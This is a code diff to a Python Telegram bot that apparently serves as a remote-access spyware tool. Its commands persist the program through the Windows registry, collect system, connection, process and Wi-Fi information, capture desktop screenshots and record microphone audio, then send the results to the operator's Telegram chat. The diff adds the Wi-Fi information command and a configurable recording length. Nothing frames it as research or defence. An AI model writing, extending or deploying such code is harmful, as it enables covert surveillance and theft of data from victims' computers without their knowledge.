@@ -19,7 +19,6 @@ except DeprecationWarning:
 
 @dp.message_handler(commands="help")
 async def support(message: types.Message):
-    # todo change audio support after remake function
     await message.answer(f'\nCommand List:\n'
                          f'/reg_autorun - Append programme to registry\n'
                          f'/del_autorun - Delete programme from registry\n'
@@ -27,8 +26,9 @@ async def support(message: types.Message):
                          f'/pc_info - System characteristics\n'
                          f'/con_info - Connection characteristics\n'
                          f'/proc_info - List of running processes\n'
+                         f'/wifi_info - Information about Wi-Fi connections\n'
                          f'/screen - Desktop screenshot\n'
-                         f'/audio - Record audio from a voice recorder for a 5 second\n'
+                         f'/audio n - (n - count of seconds)Record sound from voice recorder for 5 seconds by default\n'
                          f'/exit - Shutting down the program before reboot\n')
 
 
@@ -59,6 +59,12 @@ async def send_pc_info(message: types.Message):
     await message.answer(result)
 
 
+@dp.message_handler(commands="wifi_info")
+async def send_wifi_info(message: types.Message):
+    result = module.GetInfo().get_wifi_info()
+    await message.answer(result)
+
+
 @dp.message_handler(commands="con_info")
 async def send_connection_info(message: types.Message):
     result = module.GetInfo().get_connection_info()
@@ -84,7 +90,11 @@ async def send_screen(message: types.Message):
 
 @dp.message_handler(commands="audio")
 async def send_audio(message: types.Message):
-    audio_path = module.AudioRecording().recording()
+    if len(message.text.split(" ")) == 2:
+        seconds_count = int(message.text.split(" ")[-1])
+        audio_path = module.AudioRecording().recording(seconds_count)
+    else:
+        audio_path = module.AudioRecording().recording()
     await message.answer_audio(open(audio_path, "rb"))
     os.remove(audio_path)
 
